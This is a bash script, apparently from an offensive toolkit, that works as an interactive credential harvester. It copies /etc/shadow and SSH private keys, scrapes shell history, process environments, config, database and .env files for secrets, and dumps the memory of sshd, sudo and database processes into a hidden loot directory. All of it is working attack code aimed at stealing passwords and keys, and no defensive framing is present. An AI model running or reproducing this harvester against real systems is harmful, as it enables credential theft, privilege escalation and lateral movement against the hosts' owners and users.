#!/bin/bash
# T1552 — Unsecured Credentials / Credential Harvester
# Scrapes passwords, keys, and secrets from multiple system locations

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

LOOT_DIR="${LOOT_DIR:-/tmp/.d3m0n_loot}"
MARKER="d3m0n_cred_harvest"

banner_cred() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1552 — Credential Harvester                ║"
    echo "  ║   Scrape passwords, keys, secrets from host   ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

init_loot() {
    mkdir -p "$LOOT_DIR" 2>/dev/null
    chmod 700 "$LOOT_DIR" 2>/dev/null
    echo -e "${GREEN}[+] Loot directory: ${LOOT_DIR}${NC}"
}

harvest_shadow() {
    echo -e "${CYAN}[*] Harvesting /etc/shadow...${NC}"
    if [[ -r /etc/shadow ]]; then
        cp /etc/shadow "${LOOT_DIR}/shadow_$(date +%s)" 2>/dev/null
        local count
        count=$(grep -c ':\$' /etc/shadow 2>/dev/null)
        echo -e "${GREEN}  [+] Shadow copied — ${count} hashed passwords found${NC}"
        echo -e "${YELLOW}  [*] Crack with: john --wordlist=rockyou.txt ${LOOT_DIR}/shadow_*${NC}"
    else
        echo -e "${RED}  [!] Cannot read /etc/shadow (need root)${NC}"
    fi

    if [[ -r /etc/security/opasswd ]]; then
        cp /etc/security/opasswd "${LOOT_DIR}/opasswd_$(date +%s)" 2>/dev/null
        echo -e "${GREEN}  [+] Old passwords (opasswd) copied${NC}"
    fi
}

harvest_ssh_keys() {
    echo -e "${CYAN}[*] Harvesting SSH private keys...${NC}"
    local outf="${LOOT_DIR}/ssh_keys_$(date +%s)"
    mkdir -p "$outf" 2>/dev/null

    local count=0
    while IFS= read -r -d '' keyfile; do
        if head -1 "$keyfile" 2>/dev/null | grep -q "PRIVATE KEY"; then
            local dest="${outf}/$(echo "$keyfile" | tr '/' '_')"
            cp "$keyfile" "$dest" 2>/dev/null
            count=$((count + 1))
        fi
    done < <(find / -maxdepth 5 -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_dsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null -print0)

    echo -e "${GREEN}  [+] Found ${count} private key(s)${NC}"

    # Also grab authorized_keys for lateral movement
    find / -maxdepth 5 -name "authorized_keys" -exec cp {} "${outf}/" \; 2>/dev/null
    # Known hosts for target enumeration
    find / -maxdepth 5 -name "known_hosts" -exec cp {} "${outf}/" \; 2>/dev/null
}

harvest_history() {
    echo -e "${CYAN}[*] Harvesting shell history for passwords...${NC}"
    local outf="${LOOT_DIR}/history_passwords_$(date +%s)"

    {
        echo "=== Password patterns in shell history ==="
        for hf in /root/.bash_history /root/.zsh_history /home/*/.bash_history /home/*/.zsh_history; do
            [[ -r "$hf" ]] || continue
            echo "--- $hf ---"
            grep -iE 'pass(word)?=|passwd|mysql.*-p|sshpass|curl.*-u|wget.*--password|ftp.*:.*@|token=|secret=|api[_-]?key|auth' "$hf" 2>/dev/null
        done
    } > "$outf"

    local lc
    lc=$(wc -l < "$outf" 2>/dev/null)
    echo -e "${GREEN}  [+] History scan saved — ${lc} lines${NC}"
}

harvest_proc_environ() {
    echo -e "${CYAN}[*] Harvesting /proc/*/environ for secrets...${NC}"
    local outf="${LOOT_DIR}/proc_environ_$(date +%s)"

    {
        echo "=== Process environment variables with secrets ==="
        for envf in /proc/[0-9]*/environ; do
            [[ -r "$envf" ]] || continue
            local pid="${envf#/proc/}"
            pid="${pid%/environ}"
            local pname
            pname=$(cat "/proc/${pid}/comm" 2>/dev/null)
            local secrets
            secrets=$(tr '\0' '\n' < "$envf" 2>/dev/null | grep -iE 'pass|secret|token|key|auth|credential|api' 2>/dev/null)
            if [[ -n "$secrets" ]]; then
                echo "--- PID ${pid} (${pname}) ---"
                echo "$secrets"
            fi
        done
    } > "$outf"

    local lc
    lc=$(grep -c "^---" "$outf" 2>/dev/null)
    echo -e "${GREEN}  [+] Found secrets in ${lc} process(es)${NC}"
}

harvest_config_files() {
    echo -e "${CYAN}[*] Scanning config files for passwords...${NC}"
    local outf="${LOOT_DIR}/config_passwords_$(date +%s)"

    local SEARCH_PATHS=(
        /etc /opt /var/www /srv /home /root
        /usr/local/etc
    )
    local PATTERNS='password|passwd|pass\s*=|secret|token|api.?key|credential|db_pass|mysql_pass|pg_pass'
    local EXTENSIONS='conf|cfg|ini|env|yml|yaml|json|xml|properties|cnf|txt|php|py|rb|pl|sh'

    {
        echo "=== Config file password scan ==="
        for sp in "${SEARCH_PATHS[@]}"; do
            [[ -d "$sp" ]] || continue
            find "$sp" -maxdepth 4 -type f -regextype posix-extended \
                -regex ".*\.(${EXTENSIONS})" -size -1M 2>/dev/null | while IFS= read -r f; do
                local matches
                matches=$(grep -inE "$PATTERNS" "$f" 2>/dev/null | grep -v "^Binary" | head -5)
                if [[ -n "$matches" ]]; then
                    echo "--- $f ---"
                    echo "$matches"
                fi
            done
        done
    } > "$outf"

    local lc
    lc=$(grep -c "^---" "$outf" 2>/dev/null)
    echo -e "${GREEN}  [+] Found passwords in ${lc} config file(s)${NC}"
}

harvest_databases() {
    echo -e "${CYAN}[*] Scanning for database credentials...${NC}"
    local outf="${LOOT_DIR}/db_creds_$(date +%s)"

    {
        echo "=== Database credential files ==="

        # MySQL/MariaDB
        for f in /root/.my.cnf /home/*/.my.cnf /etc/mysql/debian.cnf /etc/mysql/my.cnf; do
            [[ -r "$f" ]] || continue
            echo "--- $f ---"
            grep -iE 'password|user' "$f" 2>/dev/null
        done

        # PostgreSQL
        for f in /root/.pgpass /home/*/.pgpass; do
            [[ -r "$f" ]] || continue
            echo "--- $f (pgpass) ---"
            cat "$f" 2>/dev/null
        done

        # Redis
        for f in /etc/redis/redis.conf /etc/redis.conf; do
            [[ -r "$f" ]] || continue
            echo "--- $f ---"
            grep -i "requirepass" "$f" 2>/dev/null
        done

        # MongoDB
        for f in /etc/mongod.conf /etc/mongodb.conf; do
            [[ -r "$f" ]] || continue
            echo "--- $f ---"
            grep -iA2 "security\|auth" "$f" 2>/dev/null
        done

        # WordPress
        find / -maxdepth 5 -name "wp-config.php" 2>/dev/null | while IFS= read -r f; do
            echo "--- $f ---"
            grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY" "$f" 2>/dev/null
        done

        # Django
        find / -maxdepth 5 -name "settings.py" 2>/dev/null | while IFS= read -r f; do
            grep -q "DATABASES" "$f" 2>/dev/null || continue
            echo "--- $f ---"
            grep -A5 "DATABASES\|SECRET_KEY\|PASSWORD" "$f" 2>/dev/null
        done

        # .env files
        find / -maxdepth 5 -name ".env" -type f 2>/dev/null | while IFS= read -r f; do
            echo "--- $f ---"
            grep -iE 'pass|secret|token|key|auth|database' "$f" 2>/dev/null
        done
    } > "$outf"

    local lc
    lc=$(grep -c "^---" "$outf" 2>/dev/null)
    echo -e "${GREEN}  [+] Found database creds in ${lc} source(s)${NC}"
}

harvest_memory() {
    echo -e "${CYAN}[*] Dumping process memory for credentials...${NC}"

    if ! command -v gcore &>/dev/null && ! command -v gdb &>/dev/null; then
        echo -e "${YELLOW}  [!] gdb/gcore not found — trying /proc/PID/mem method${NC}"
    fi

    local outf="${LOOT_DIR}/memdump_$(date +%s)"
    mkdir -p "$outf" 2>/dev/null

    # Target high-value processes
    local TARGETS=("sshd" "sudo" "su" "login" "apache2" "nginx" "mysql" "postgres" "vsftpd")
    local dumped=0

    for tgt in "${TARGETS[@]}"; do
        local pids
        pids=$(pgrep -x "$tgt" 2>/dev/null)
        [[ -z "$pids" ]] && continue

        for pid in $pids; do
            if command -v gcore &>/dev/null; then
                gcore -o "${outf}/${tgt}_${pid}" "$pid" 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    strings "${outf}/${tgt}_${pid}."* 2>/dev/null | grep -iE 'password|passwd|pass=|secret' > "${outf}/${tgt}_${pid}_strings.txt" 2>/dev/null
                    dumped=$((dumped + 1))
                fi
            else
                # Fallback: read /proc/PID/maps + /proc/PID/mem
                if [[ -r "/proc/${pid}/maps" && -r "/proc/${pid}/mem" ]]; then
                    grep "r-" "/proc/${pid}/maps" 2>/dev/null | head -20 | while IFS='-' read -r start rest; do
                        local end="${rest%% *}"
                        dd if="/proc/${pid}/mem" bs=1 skip=$((16#$start)) count=$(( (16#$end) - (16#$start) )) 2>/dev/null
                    done | strings 2>/dev/null | grep -iE 'password|passwd|pass=|secret' > "${outf}/${tgt}_${pid}_strings.txt" 2>/dev/null
                    [[ -s "${outf}/${tgt}_${pid}_strings.txt" ]] && dumped=$((dumped + 1))
                fi
            fi
        done
    done

    echo -e "${GREEN}  [+] Dumped memory from ${dumped} process(es)${NC}"
}

harvest_preseed() {
    echo -e "${CYAN}[*] Scanning for preseed/kickstart files...${NC}"
    local outf="${LOOT_DIR}/preseed_$(date +%s)"

    {
        # Debian preseed
        find / -maxdepth 5 \( -name "preseed.cfg" -o -name "preseed*.cfg" \) 2>/dev/null | while IFS= read -r f; do
            echo "--- $f ---"
            grep -iE 'passwd|password|root-password|user-password' "$f" 2>/dev/null
        done

        # RedHat kickstart
        find / -maxdepth 5 \( -name "*.ks" -o -name "anaconda-ks.cfg" \) 2>/dev/null | while IFS= read -r f; do
            echo "--- $f ---"
            grep -iE 'rootpw|user.*password|auth' "$f" 2>/dev/null
        done

        # Cloud-init
        find / -maxdepth 5 -name "user-data" -o -name "cloud-config*" 2>/dev/null | while IFS= read -r f; do
            [[ -r "$f" ]] || continue
            echo "--- $f ---"
            grep -iE 'passwd|password|ssh_authorized_keys|chpasswd' "$f" 2>/dev/null
        done
    } > "$outf"

    local lc
    lc=$(grep -c "^---" "$outf" 2>/dev/null)
    echo -e "${GREEN}  [+] Found ${lc} preseed/kickstart/cloud-init file(s)${NC}"
}

main() {
    banner_cred

    if [[ $EUID -ne 0 ]]; then
        echo -e "${YELLOW}[!] Running without root — results will be limited${NC}"
    fi

    echo -e "  ${CYAN}[1]${NC} Harvest /etc/shadow + opasswd"
    echo -e "  ${CYAN}[2]${NC} Harvest SSH private keys"
    echo -e "  ${CYAN}[3]${NC} Harvest shell history passwords"
    echo -e "  ${CYAN}[4]${NC} Harvest /proc/*/environ secrets"
    echo -e "  ${CYAN}[5]${NC} Scan config files for passwords"
    echo -e "  ${CYAN}[6]${NC} Scan database credentials"
    echo -e "  ${CYAN}[7]${NC} Dump process memory for creds"
    echo -e "  ${CYAN}[8]${NC} Scan preseed/kickstart/cloud-init"
    echo -e "  ${CYAN}[9]${NC} ${RED}HARVEST ALL${NC} (run everything)"
    echo ""
    read -p "Choose [1-9]: " OPT

    init_loot

    case "$OPT" in
        1) harvest_shadow ;;
        2) harvest_ssh_keys ;;
        3) harvest_history ;;
        4) harvest_proc_environ ;;
        5) harvest_config_files ;;
        6) harvest_databases ;;
        7) harvest_memory ;;
        8) harvest_preseed ;;
        9)
            harvest_shadow
            harvest_ssh_keys
            harvest_history
            harvest_proc_environ
            harvest_config_files
            harvest_databases
            harvest_memory
            harvest_preseed
            echo ""
            echo -e "${GREEN}[+] Full harvest complete. All loot in: ${LOOT_DIR}${NC}"
            echo -e "${YELLOW}[*] Loot summary:${NC}"
            ls -la "$LOOT_DIR" 2>/dev/null
            du -sh "$LOOT_DIR" 2>/dev/null
            ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
